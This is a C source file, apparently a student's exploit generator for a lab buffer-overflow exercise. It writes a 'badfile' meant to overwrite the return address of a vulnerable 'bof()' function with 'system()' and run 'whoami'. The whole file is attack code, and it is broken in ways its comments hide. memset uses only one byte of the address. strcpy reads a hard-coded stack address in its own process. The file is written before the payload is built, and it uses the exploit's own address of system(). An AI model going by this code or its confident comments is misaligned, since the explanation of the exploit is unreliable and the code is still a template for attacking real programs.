#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// This is the address of the buffer in the vuln.c code file. displayed in the screenshot as well.
#define BUFFER_ADDRESS 0xbffff487

int main(int argc, char **argv)
{
    // Create a buffer that is larger than the buffer in the vuln.c code file.
    char large_buffer[500];

    // Fill the buffer with the address of the buffer in the vuln.c code file.
    memset(large_buffer, BUFFER_ADDRESS, 500);

    // Open the badfile file in write mode.
    FILE *badfile = fopen("badfile", "w");

    // Write the contents of the large_buffer to the badfile.
    fwrite(large_buffer, sizeof(char), 500, badfile);

    // Close the badfile file.
    fclose(badfile);

    // Overwrite the buffer in the vuln.c code file with the contents of the large_buffer.
    // This will cause a stack smash and allow us to execute arbitrary code.
    strcpy(large_buffer, (char *)BUFFER_ADDRESS);

    // Insert the address of the `system()` function into the buffer,
    // overwriting the return address of the `bof()` function.
    // This will cause the program to jump to the `system()` function
    // when it returns from `bof()`.
    *(unsigned long *)&large_buffer[100 - 4] = (unsigned long)system;

    // Add the command that you want to execute to the end of the buffer.
    // This will be passed as an argument to the `system()` function
    // when the program jumps to it.
    strcat(large_buffer, "whoami");

    // Run the vuln.c code file, which will read the input string from the badfile
    // and overflow the buffer, causing a stack smash and jumping to the `system()`
    // function with the supplied argument.
    system("./vuln");

    return 0;
}